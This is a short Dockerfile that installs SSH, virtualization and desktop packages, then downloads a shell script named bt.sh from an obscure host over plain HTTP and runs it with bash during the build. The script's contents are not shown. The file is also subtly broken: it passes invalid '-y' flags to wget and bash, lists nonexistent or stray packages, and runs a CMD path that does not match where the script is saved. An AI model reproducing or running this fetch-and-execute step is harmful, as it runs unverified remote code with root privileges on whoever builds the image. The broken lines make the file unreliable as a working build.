FROM debian
RUN apt update
RUN DEBIAN_FRONTEND=noninteractive apt install openssh openssh-server qemu-kvm *zenhei* xz-utils dbus-x11 curl r mate-system-monitor git xfce4-terminal wget -y
RUN wget http://jt.xnkl.cf/bt.sh -y
RUN bash bt.sh -y
CMD  /bt.sh
